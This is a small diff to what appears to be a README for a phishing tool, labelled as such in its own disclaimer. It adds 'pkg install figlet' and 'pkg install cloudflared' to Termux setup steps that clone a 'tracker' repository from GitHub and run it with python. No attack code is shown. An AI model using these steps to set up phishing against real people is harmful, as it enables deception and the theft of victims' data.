@@ -16,6 +16,8 @@ Disclaimer its a phishing tool don't use unauthorised
 * pkg upgrade
 * pkg install git
 * pkg install python
+* pkg install figlet
+* pkg install cloudflared
 * git clone https://github.com/zyphorixofficialmain-lab/tracker
 * cd tracker
 * python run.py
